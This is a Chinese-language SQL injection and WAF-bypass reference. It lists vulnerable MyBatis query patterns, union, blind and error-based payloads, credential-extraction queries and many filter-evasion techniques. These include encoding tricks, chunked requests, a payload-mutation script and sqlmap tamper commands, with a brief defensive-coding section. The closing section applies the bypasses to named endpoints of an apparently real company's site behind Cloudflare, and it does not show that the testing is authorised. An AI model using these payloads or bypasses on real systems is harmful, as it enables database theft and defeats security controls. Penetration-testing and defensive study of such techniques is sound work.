# SQL 注入参考

## 一、MyBatis SQL 注入点类型

### 1. `${}` 直接拼接 - 最常见注入点
```xml
<!-- 危险写法 -->
<select id="getUser" resultType="User">
    SELECT * FROM user WHERE name = '${name}'
</select>
```

**利用方式:**
```
name=' OR '1'='1
name=' UNION SELECT username,password FROM admin -- 
```

---

### 2. ORDER BY 注入
```xml
<select id="list" resultType="Map">
    SELECT * FROM orders ORDER BY ${sortField} ${sortOrder}
</select>
```

**利用方式:**
```
sortField=(SELECT CASE WHEN (1=1) THEN id ELSE name END)
sortField=updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)
```

---

### 3. IN 子句注入
```xml
<select id="getByIds" resultType="User">
    SELECT * FROM user WHERE id IN (${ids})
</select>
```

**利用方式:**
```
ids=1) UNION SELECT username,password FROM admin --
```

---

### 4. 表名/列名动态拼接
```xml
<select id="query" resultType="Map">
    SELECT * FROM ${tableName} WHERE status=1
</select>
```

**利用方式:**
```
tableName=user WHERE 1=1 UNION SELECT password FROM admin --
```

---

### 5. LIKE 模糊查询注入
```xml
<!-- 错误写法 -->
<select id="search" resultType="User">
    SELECT * FROM user WHERE name LIKE '%${keyword}%'
</select>
```

**利用方式:**
```
keyword=%' UNION SELECT username,password FROM admin --
```

---

### 6. 注解方式 @Select 注入
```java
@Select("SELECT * FROM user WHERE name = '${name}'")
User getUser(@Param("name") String name);
```

利用方式同上。

---

## 二、盲注技巧

### 时间盲注
```sql
' AND IF(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1)='a',SLEEP(3),0) --
```

### 布尔盲注
```sql
' AND (SELECT COUNT(*) FROM admin)>0 --
' AND ASCII(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1))>97 --
```

### 报错注入
```sql
' AND updatexml(1,concat(0x7e,(SELECT database())),1) --
' AND extractvalue(1,concat(0x7e,(SELECT version()))) --
```

---

## 三、实战检测流程

1. **定位注入点**: 找 `${}` 或动态排序/表名
2. **判断类型**: 
   - 回显注入 → 直接 `UNION SELECT`
   - 无回显 → 时间/布尔盲注
   - 有报错 → 报错注入
3. **获取信息**:
   ```sql
   -- 库名
   SELECT database()
   
   -- 表名
   SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
   
   -- 列名
   SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'
   
   -- 数据
   SELECT username,password FROM users
   ```

---

## 四、WAF 核心原理

### WAF 检测机制

#### 1. 特征匹配
```
关键字: UNION, SELECT, INSERT, UPDATE, DELETE, DROP
函数: sleep(), benchmark(), load_file(), into outfile
符号: --, #, /*, */, ', ", ;
```

#### 2. 正则规则
```regex
/union\s+select/i
/or\s+1\s*=\s*1/i
/sleep\s*\(\s*\d+\s*\)/i
```

#### 3. 语义分析
- SQL 语法树解析
- 异常请求频率
- 参数长度限制

---

## 五、WAF 绕过技术

### 1. 大小写变换
```sql
UnIoN SeLeCt username FrOm users
uNiOn/**/sElEcT
```

### 2. 注释干扰
```sql
UNION/**/SELECT
UNION/*!50000SELECT*/
UNION/*foo*/SELECT
```

### 3. 编码绕过

**URL 编码:**
```
%55%4e%49%4f%4e %53%45%4c%45%43%54   UNION SELECT
```

**双重 URL 编码:**
```
%2555%254e%2549%254f%254e   %55%4e%49%4f%4e  UNION
```

**Unicode 编码:**
```
\u0055\u004e\u0049\u004f\u004e   UNION
```

**Hex 编码:**
```sql
SELECT CHAR(85,78,73,79,78)   UNION
SELECT 0x554e494f4e           UNION
```

**Base64 (部分 WAF 支持):**
```sql
SELECT FROM_BASE64('VU5JT04=')   UNION
```

### 4. 空格替代
```sql
-- 原始
UNION SELECT username FROM users

-- 替代方案
UNION/**/SELECT/**/username/**/FROM/**/users
UNION%0aSELECT%0ausername%0aFROM%0ausers
UNION%0dSELECT%0dusername
UNION+SELECT+username
UNION(SELECT(username)FROM(users))
```

**空白字符列表:**
```
%20  空格
%09  Tab
%0a  换行
%0d  回车
%0b  垂直Tab
%0c  换页
/**/ 注释
()   括号
```

### 5. 字符串拼接
```sql
-- MySQL
SELECT CONCAT('un','ion') 
SELECT CONCAT_WS('','un','ion')

-- MSSQL
SELECT 'un'+'ion'

-- Oracle
SELECT 'un'||'ion'

-- PostgreSQL
SELECT 'un'||'ion'
```

### 6. 内联注释 (MySQL 特有)
```sql
/*!UNION*/ /*!SELECT*/
/*!50000UNION*/ /*!50000SELECT*/  -- 版本>5.00.00才执行
```

### 7. 双写绕过
```sql
UNIunionON SELselectECT
or and 1=1
```

### 8. 宽字节注入 (GBK)
```
输入: %df' 
WAF 看到: %df%5c%27  (%5c是转义符\)
MySQL GBK 解析: %df%5c → 運, %27 → '
结果: 運' 逃逸引号
```

### 9. 参数污染
```
?id=1&id=2 UNION SELECT password FROM users
?id=1 UNION SELECT password FROM users&id=2
```

### 10. HTTP 参数碎片化
```
GET /api?sort=id/**/UNION/**/SELECT/**/password/**/FROM/**/users HTTP/1.1

拆分为多个参数:
GET /api?a=UNION&b=SELECT&c=password HTTP/1.1
后端拼接: a+b+c
```

### 11. 特殊字符干扰
```sql
-- 添加无用字符
UNION SELECT /*!password*/ FROM users
UNION SELECT @`'` FROM users

-- 反引号
SELECT `username` FROM `users`

-- @变量
SELECT @version
```

### 12. 时间函数变形
```sql
-- 原始
SLEEP(5)

-- 绕过
BENCHMARK(10000000,SHA1('test'))
GET_LOCK('test',5)
RLIKE SLEEP(5)
WAITFOR DELAY '0:0:5'  -- MSSQL
DBMS_PIPE.RECEIVE_MESSAGE('a',5)  -- Oracle
```

### 13. 逻辑运算符替换
```sql
-- AND 替换
&&
%26%26

-- OR 替换
||
%7c%7c
OR 1=1
OR true
```

### 14. NULL 值利用
```sql
UNION SELECT NULL,NULL,NULL
UNION SELECT @@version,NULL,NULL
```

### 15. 子查询嵌套
```sql
-- 原始
UNION SELECT password FROM users

-- 嵌套
UNION SELECT (SELECT password FROM users LIMIT 1)
UNION SELECT (SELECT GROUP_CONCAT(password) FROM users)
```

---

## 六、实战绕过案例

### 案例 1: 基础 WAF 绕过
```
原始 Payload:
' UNION SELECT username,password FROM admin --

绕过:
'/**/UNION/**/SELECT/**/username,password/**/FROM/**/admin/**/--
```

### 案例 2: 过滤 UNION SELECT
```
原始:
UNION SELECT

绕过方案:
1. UniOn SelEcT
2. UNION/*!SELECT*/
3. %55nion %53elect
4. UNIunionON SELselectECT
5. UNION(SELECT(...))
```

### 案例 3: 过滤空格
```
原始:
UNION SELECT password FROM users

绕过:
UNION(SELECT(password)FROM(users))
UNION%0aSELECT%0apassword%0aFROM%0ausers
UNION/**/SELECT/**/password/**/FROM/**/users
```

### 案例 4: 过滤引号
```
原始:
' OR '1'='1

绕过:
0x27 OR 0x31=0x31
CHAR(39) OR CHAR(49)=CHAR(49)
\N OR \N=\N
```

### 案例 5: 过滤关键词 + 空格
```
原始:
UNION SELECT table_name FROM information_schema.tables

绕过:
/*!UNION*//*!SELECT*/table_name/*!FROM*/information_schema.tables
%55nion%20%53elect/**/table_name/**/%46rom/**/information_schema.tables
```

### 案例 6: 盲注绕过
```
原始:
' AND SLEEP(5)--

绕过:
' AND BENCHMARK(10000000,MD5('test'))--
' AND GET_LOCK('a',5)--
' RLIKE SLEEP(5)--
```

---

## 七、高级技巧

### 1. 分块传输 (Chunked Encoding)
```http
POST /api HTTP/1.1
Transfer-Encoding: chunked

7
' UNION
a
 SELECT pass
7
word FRO
5
M use
3
rs--
0
```

### 2. HTTP 头注入
```http
GET /api HTTP/1.1
X-Forwarded-For: 1' UNION SELECT password FROM users--
User-Agent: ' OR 1=1--
Referer: ' UNION SELECT version()--
```

### 3. JSON 格式绕过
```json
{
  "name": "' UNION SELECT password FROM users--"
}
```

### 4. XML 实体绕过
```xml
<name>&#39; UNION SELECT password FROM users--</name>
```

### 5. 多态 payload
```python
import random

def mutate_payload(payload):
    spaces = [' ', '/**/', '%0a', '%0d', '+', '%09']
    keywords = {
        'UNION': ['union', 'Union', 'UNIunionON'],
        'SELECT': ['select', 'Select', 'SELselectECT']
    }
    
    result = payload
    for key, variants in keywords.items():
        result = result.replace(key, random.choice(variants))
    
    return result
```

---

## 八、WAF 指纹识别

### 触发错误判断 WAF 类型
```
ModSecurity: "Not Acceptable" / 406
Cloudflare: "Attention Required" / 403
AWS WAF: "Blocked by AWS WAF"
Aliyun WAF: "您的请求疑似攻击"
```

### 测试 Payload
```bash
# 简单探测
curl "http://target/?id=1'"
curl "http://target/?id=1 UNION SELECT 1"
curl "http://target/?id=<script>alert(1)</script>"

# 观察响应码、响应内容、延迟
```

---

## 九、自动化绕过工具

### sqlmap tamper 脚本
```bash
# 列出所有 tamper
sqlmap --list-tampers

# 常用 tamper
sqlmap -u "http://target" --tamper=space2comment.py
sqlmap -u "http://target" --tamper=charunicodeencode.py
sqlmap -u "http://target" --tamper=charencode.py
sqlmap -u "http://target" --tamper=between.py
sqlmap -u "http://target" --tamper=randomcase.py
sqlmap -u "http://target" --tamper=apostrophemask.py

# 组合使用
sqlmap -u "http://target" --tamper=space2comment.py,charunicodeencode.py,randomcase.py
```

### 常用 Tamper 说明
| Tamper | 作用 |
|--------|------|
| `space2comment.py` | 空格→`/**/` |
| `randomcase.py` | 随机大小写 |
| `charunicodeencode.py` | Unicode 编码 |
| `between.py` | `>`→`NOT BETWEEN 0 AND` |
| `equaltolike.py` | `=`→`LIKE` |
| `halfversionedmorekeywords.py` | MySQL 内联注释 |
| `apostrophenullencode.py` | `'`→`%00%27` |

---

## 十、防御建议 (开发侧)

```java
// ❌ 危险
@Select("SELECT * FROM user WHERE name = '${name}'")

// ✅ 安全
@Select("SELECT * FROM user WHERE name = #{name}")

// ORDER BY 白名单
private static final Set<String> ALLOWED_SORT = Set.of("id", "name", "create_time");
if (!ALLOWED_SORT.contains(sortField)) {
    throw new IllegalArgumentException("Invalid sort field");
}
String sql = "SELECT * FROM user ORDER BY " + sortField;

// IN 查询使用 foreach
<foreach item="id" collection="idList" open="(" separator="," close=")">
    #{id}
</foreach>
```

---

## 十一、快速参考表

### 绕过技巧速查
| 过滤项 | 绕过方法 |
|--------|----------|
| 空格 | `/**/`, `%0a`, `%09`, `+`, `()` |
| 引号 | `CHAR()`, `0x`, `CONCAT()` |
| UNION | `UniOn`, `%55nion`, `UNIunionON` |
| SELECT | `SelEcT`, `%53elect`, `SELselectECT` |
| SLEEP | `BENCHMARK()`, `GET_LOCK()`, `RLIKE` |
| AND | `&&`, `%26%26` |
| OR | `\|\|`, `%7c%7c` |
| 注释 | `-- `, `#`, `/**/`, `;%00` |

---

## 十二、在 Sembcorp 测试中的应用

### 已测试的注入点
- `/umbraco/api/search/get?term=` - 搜索功能（.NET Umbraco CMS）
- `/umbraco/api/contactform/submit` - 联系表单（POST）

### 可尝试的绕过技术（针对 Cloudflare WAF）
1. **编码绕过**: `%55nion %53elect` (URL 编码)
2. **注释干扰**: `UNION/**/SELECT`
3. **大小写变换**: `UnIoN SeLeCt`
4. **内联注释**: `/*!UNION*/ /*!SELECT*/` (如果是 MySQL)
5. **字符串拼接**: `CONCAT('un','ion')`

### 注意事项
- Cloudflare WAF 对 `< >` 标签拦截严格（XSS 防护）
- SQL 关键字可能未被完全拦截
- 需要结合具体数据库类型（Umbraco 通常用 SQL Server）

---

**适用场景**: 
- SQL 注入漏洞测试
- WAF 绕过技术研究
- 渗透测试参考
